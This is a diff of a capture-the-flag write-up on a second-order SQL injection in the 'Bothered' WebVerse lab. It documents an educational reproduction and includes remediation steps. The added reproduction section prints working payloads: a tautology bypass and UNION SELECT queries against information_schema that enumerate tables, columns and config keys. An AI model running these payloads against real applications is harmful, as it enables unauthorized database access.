@@ -1,7 +1,7 @@
 ---
 title: "WebVerse Bothered - Second-Order SQL Injection via Stored Username"
 date: 2026-08-10T00:00:00+02:00
-lastmod: 2026-08-10T00:00:00+02:00
+lastmod: 2026-08-11T00:00:00+02:00
 draft: false
 author: "Mdk22"
 description: "A persisted username reached a later donation-history SQL consumer, producing a verified second-order SQL injection and a bounded objective read."
@@ -16,6 +16,7 @@ tags:
   - "Stored Input"
   - "Caido"
   - "CWE-89"
+  - "CWE-209"
 platform: "WebVerse"
 lab: "Bothered"
 difficulty: "Easy"
@@ -36,14 +37,17 @@ case_independent_curl: false
 primary_cwe: "CWE-89"
 cwes:
   - "CWE-89"
+  - "CWE-209"
 patterns:
   - "SQL Injection"
+  - "Sensitive Configuration Disclosure"
 methods:
   - "Consumer Mapping"
+  - "Invalid-versus-Valid Differential"
   - "Authoritative Status Check"
 ---
 
-> **Publication note:** This article documents a fresh reproduction in an authorized WebVerse educational lab. Current-instance hostnames, credentials, session values, exact payload strings, and the literal objective are excluded. The public objective representation is `WEBVERSE{REDACTED}`.
+> **Publication note:** This article documents a fresh reproduction in an authorized WebVerse educational lab. Current-instance hostnames, credentials, session values, test-account identifiers, and the literal objective are excluded. The public objective representation is `WEBVERSE{REDACTED}`. The bounded SQL controls and metadata-projection payloads below were verified in this reproduction; the final secret-bearing selector remains private.
 
 ## Executive Summary
 
@@ -78,7 +82,8 @@ Harmless HTML canaries in the observed public `display_name` and donation-messag
 | Stored source | Registration username |
 | Later consumer | Authenticated donation-history workflow |
 | Observed stack | PHP 8.2.31, PDO, MariaDB |
-| Primary weakness | CWE-89 - SQL Injection |
+| Primary weakness | [CWE-89](/cwes/cwe-89/) - SQL Injection |
+| Supporting weakness | [CWE-209](/cwes/cwe-209/) - verbose PDO/MariaDB error disclosure |
 | Evidence | Fresh-instance Caido evidence with Chromium solved-state confirmation |
 
 ## 3. Scope and Evidence Boundary
@@ -86,7 +91,7 @@ Harmless HTML canaries in the observed public `display_name` and donation-messag
 - Every test used a fresh, self-created account; no foreign credentials or historical sessions were reused.
 - Each stored control used a separate account, keeping the observed effect attributable to one controlled input.
 - One benign donation was created under the baseline account to establish the normal populated history contract and a known cross-account marker.
-- Exact payload syntax, session cookies, hostnames, credentials, test-account identifiers, and the literal flag are intentionally omitted.
+- P-01 through P-05 are exact bounded values used in this authorized lab. Dynamic host, session, credential, and flag values are not published.
 - The evidence establishes a SELECT-oriented data effect only. It does not establish database write capability, filesystem reads, command execution, password extraction, or access outside the authorized lab.
 
 ## 4. Normal Donation-History Baseline
@@ -139,7 +144,124 @@ Only configuration key names were then read. The result included `site_flag` wit
 
 **Figure 6 - Key mapping.** The objective-oriented key is established before any value is read.
 
-## 8. Targeted Objective Read and Atomic Stop
+## 8. Reproduction Commands and Payloads
+
+The following are public-safe, copyable request models and payloads used in the fresh Caido reproduction. They explain the verified evidence chain; they are not a generic testing sequence. Each payload was stored as the raw `username` during registration of a separate self-owned account, then reused unchanged at login. The browser transported the value as `application/x-www-form-urlencoded` data.
+
+### Baseline Request Flow
+
+**Baseline registration** establishes the normal form schema and successful write-path redirect before any SQL-specific mutation.
+
+```http
+POST /register.php HTTP/1.1
+Host: <LAB_HOST>
+Content-Type: application/x-www-form-urlencoded
+
+display_name=<CONTROLLED_NAME>&email=<UNIQUE_LAB_EMAIL>&username=<CONTROLLED_USERNAME>&password=<REDACTED>&password_confirm=<REDACTED>
+```
+
+Expected semantic result: HTTP `302` with `Location: /login.php?welcome=1`. This proves only the normal registration contract.
+
+**Baseline login** verifies that the same self-owned account can authenticate through the normal application flow.
+
+```http
+POST /login.php HTTP/1.1
+Host: <LAB_HOST>
+Content-Type: application/x-www-form-urlencoded
+
+username=<SAME_CONTROLLED_USERNAME>&password=<REDACTED>
+```
+
+Expected semantic result: HTTP `302` with `Location: /index.php`. This establishes authentication, not SQL execution.
+
+**Authenticated history request** activates the later consumer while keeping the `GET` itself free of injected query or body parameters.
+
+```http
+GET /donations.php HTTP/1.1
+Host: <LAB_HOST>
+Cookie: PHPSESSID=<SESSION_COOKIE>
+```
+
+Expected semantic result: a normal HTTP `200` history view for the baseline account. For stored-control accounts, the same request activates the later SQL consumer.
+
+### Verified Payload Progression
+
+| ID | Purpose | Expected semantic result | Publication status |
+| --- | --- | --- | --- |
+| P-01 | Stored SQL error control | Later history request reaches the SQL parser and returns the PDO/MariaDB syntax oracle. | Exact |
+| P-02 | Boolean result-set proof | A new account sees rows beyond its own history, including the known baseline row. | Exact |
+| P-03 | Current-schema table names | Message returns `users,donations,config`. | Exact |
+| P-04 | `config` column names | Message returns `name,value`. | Exact |
+| P-05 | `config` key names | Message identifies `site_flag` before any value read. | Exact |
+| P-06 | Targeted objective read | One secret-bearing value is read, then submitted and accepted. | Described only |
+
+#### P-01 - Stored SQL Error Control
+
+This control verifies that the persisted username reaches a later SQL parser. The block is the exact `application/x-www-form-urlencoded` field representation. After decoding, the final character following `--` is a literal ASCII space; it is significant to the MariaDB/MySQL comment representation.
+
+```text
+username=mmp%27+OR+%271%27%3D%271%27+--+
+```
+
+Expected semantic result: the later `GET /donations.php` triggers `SQLSTATE[42000]` / MariaDB syntax failure near `ORDER BY created_at DESC`. This is a sink-control step, not reliable extraction proof.
+
+#### P-02 - Boolean Result-Set Proof
+
+This corrected comment form verifies syntactically valid SQL expression control after the parser-only error control. In form transport, `#` is encoded as `%23`.
+
+```text
+mmp' OR '1'='1' #
+```
+
+Expected semantic result: the new account's history expands and includes the known `5.00` Share donation from another controlled account. This proves result-set control rather than a status-code or body-length anomaly.
+
+#### P-03 - Current-Schema Table Names
+
+This bounded projection uses the already established three-field result shape to return table names only from the current schema.
+
+```text
+mmp' UNION SELECT 0,GROUP_CONCAT(table_name),NOW()
+FROM information_schema.tables
+WHERE table_schema=database() #
+```
+
+Expected semantic result: the Message field returns `users,donations,config`. No table contents are read at this stage.
+
+#### P-04 - `config` Column Names
+
+This payload constrains `information_schema` metadata to the already identified `config` table.
+
+```text
+mmp' UNION SELECT 0,GROUP_CONCAT(column_name),NOW()
+FROM information_schema.columns
+WHERE table_schema=database() AND table_name='config' #
+```
+
+Expected semantic result: the Message field returns `name,value`, establishing the bounded key/value layout for the objective lookup.
+
+#### P-05 - `config` Key Names
+
+This payload enumerates only `config` key names, deliberately avoiding their values.
+
+```text
+mmp' UNION SELECT 0,GROUP_CONCAT(name),NOW() FROM config #
+```
+
+Expected semantic result: the Message field returns `charity_reg,contact_email,founding_year,site_flag`. The presence of `site_flag` identifies the objective key before any secret-bearing value is read.
+
+#### P-06 - Targeted Objective Read
+
+The same verified three-column `UNION` projection was constrained to the confirmed `config` source and the already identified `site_flag` key. The final selector and literal value are intentionally not published. The public result is `WEBVERSE{REDACTED}`, followed immediately by the atomic stop and independent platform submission.
+
+### Evidence Boundary
+
+- P-01 proves source-to-sink continuity and SQL parser involvement; by itself it does not prove reliable extraction.
+- P-02 proves valid SQL expression and result-set control by returning a known record from a different controlled account.
+- P-03 through P-05 prove a bounded three-column projection and minimal metadata mapping needed to identify the objective key.
+- P-06 is the only secret-bearing read. Its exact selector remains private.
+- No curl, shell, destructive SQL, bulk extraction, persistence, or out-of-scope command was executed or added to this article.
+
+## 9. Targeted Objective Read and Atomic Stop
 
 After the objective-oriented key was established, the final read was constrained to that single value. Figure 7 shows the redacted result in the existing Message field. The preceding metadata projections, rather than this final screenshot alone, establish the compatible UNION alignment and bounded source selection.
 
@@ -149,7 +271,7 @@ The exact current-instance selector remains private. No reusable query or payloa
 
 **Figure 7 - Targeted objective read.** The public-safe response records the redacted result. No additional schema enumeration or value reads followed.
 
-## 9. Independent Solved-State Confirmation
+## 10. Independent Solved-State Confirmation
 
 The resulting current-instance objective was submitted to WebVerse immediately after the targeted read. The platform reported **Challenge Solved** and **Flag accepted**, providing an authoritative outcome oracle independent from the application's history response.
 
@@ -157,19 +279,19 @@ The resulting current-instance objective was submitted to WebVerse immediately a
 
 **Figure 8 - Authoritative confirmation.** WebVerse accepted the reproduced objective for Bothered.
 
-## 10. Root Cause and CWE Mapping
+## 11. Root Cause and CWE Mapping
 
 The root cause is [CWE-89](https://cwe.mitre.org/data/definitions/89.html): externally influenced data changes SQL structure instead of remaining bound data. Here, the relevant failure occurs in the later read path, not necessarily where the username is first stored.
 
-The verbose PDO/MariaDB error is a confirmed disclosure consequence, but it is not needed as a separate root-cause classification. Likewise, accepting a username at registration does not prove that the registration INSERT was parameterized; the verified issue is unsafe construction of the later history query.
+The verbose PDO/MariaDB error is a separately demonstrated [CWE-209](/cwes/cwe-209/) condition. It exposed SQLSTATE details, the database engine, a filesystem path, source line, and a query suffix. It is a supporting weakness, not a substitute for the confirmed SQL injection root cause. Likewise, accepting a username at registration does not prove that the registration INSERT was parameterized; the verified issue is unsafe construction of the later history query.
 
-## 11. Impact
+## 12. Impact
 
 Within the authorized lab, the demonstrated impact progressed from SQL parser disclosure to cross-record donation visibility, schema metadata disclosure, targeted configuration metadata disclosure, and one targeted configuration-value read.
 
 The reproduction intentionally did **not** test writes, deletes, filesystem reads, operating-system command execution, password extraction, persistence, or access beyond the current lab instance. Those capabilities must not be inferred from the confirmed evidence.
 
-## 12. Remediation
+## 13. Remediation
 
 1. **Parameterize every later query.** Persisted user-controlled values remain untrusted whenever they enter a new SQL context.
 2. **Bind history to an immutable server-derived user ID.** Do not construct authorization or history selection from a mutable username.
@@ -177,16 +299,16 @@ The reproduction intentionally did **not** test writes, deletes, filesystem read
 4. **Apply database least privilege.** The donation-history role should not be able to read secret-bearing configuration values.
 5. **Regression-test the lifecycle.** Store a quote/comment-bearing test value, log in normally, and exercise every later consumer. The consumer must return only that account's authorized records and never expose a database exception.
 
-## 13. Minimal Public Reproduction Model
+## 14. Minimal Public Reproduction Model
 
 1. Create and authenticate a self-owned normal account; capture the normal history response.
-2. Use a separate self-owned account with a bounded stored SQL delimiter/control; then request its authenticated history consumer.
+2. Use a separate self-owned account with the published P-01 stored SQL control; then request its authenticated history consumer.
 3. Confirm a later SQL-specific oracle even though the history request introduces no new query or body parameter.
 4. Use a fresh account with a syntactically valid boolean control and confirm a semantic result-set expansion beyond that account's own records.
-5. Use the known three-field projection for a bounded metadata ladder: table names, target columns, target key names, then one approved objective value.
-6. Redact the objective, stop immediately after proof, and submit it to the lab platform.
+5. Use P-03 through P-05 only as the bounded metadata ladder: table names, target columns, target key names, then one approved objective value.
+6. Redact the objective, stop immediately after proof, and submit it to the lab platform. Do not publish the final selector or literal value.
 
-## Conclusion
+## 15. Conclusion
 
 Bothered demonstrates why persisted input must be treated as untrusted at every later interpreter boundary. The evidence establishes a complete second-order SQL injection chain: normal account lifecycle, later SQL parser error, valid boolean result-set differential, compatible UNION projection, minimal metadata mapping, one targeted objective read, and an independently accepted submission.
 
